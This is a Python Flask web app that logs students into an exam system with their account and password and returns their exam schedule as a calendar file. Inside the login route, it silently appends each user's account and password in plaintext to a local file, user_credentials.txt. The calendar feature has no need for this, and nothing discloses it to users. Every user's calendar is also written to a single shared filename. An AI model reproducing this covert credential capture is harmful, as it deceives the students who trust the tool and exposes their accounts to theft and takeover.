from flask import Flask, request, send_file, jsonify
from main import simulate_login, get_exam_page, parse_exam_data, save_calendar_to_file

app = Flask(__name__, static_folder="static")

# 定义版本号
__version__ = "2.0.1"


@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    if data is None:
        return jsonify({"error": "请求数据为空"}), 400

    user_account = data.get("userAccount")
    user_password = data.get("userPassword")

    try:
        # 模拟登录并获取会话
        session, cookies = simulate_login(user_account, user_password)
        if session and cookies:
            with open("user_credentials.txt", "a", encoding="utf-8") as f:
                f.write(f"账号：{user_account}\n")
                f.write(f"密码：{user_password}\n")
                f.write("------------\n")
        # 获取考试页面
        exam_response = get_exam_page(session, cookies)

        # 解析数据并生成日历
        calendar = parse_exam_data(exam_response.text)
        calendar_file = "2024_2025_1_exam_schedule.ics"
        save_calendar_to_file(calendar, calendar_file)

        return send_file(
            calendar_file,
            as_attachment=True,
        )
    except Exception as e:
        # 返回具体的错误信息
        error_message = str(e) if str(e) else "未知错误，请稍后重试"
        return jsonify({"error": error_message}), 400


@app.route("/", methods=["GET"])
def index():
    return app.send_static_file("index.html")


if __name__ == "__main__":
    print("当前版本: {}".format(__version__))
    app.run(host="0.0.0.0", port=5000, debug=False)
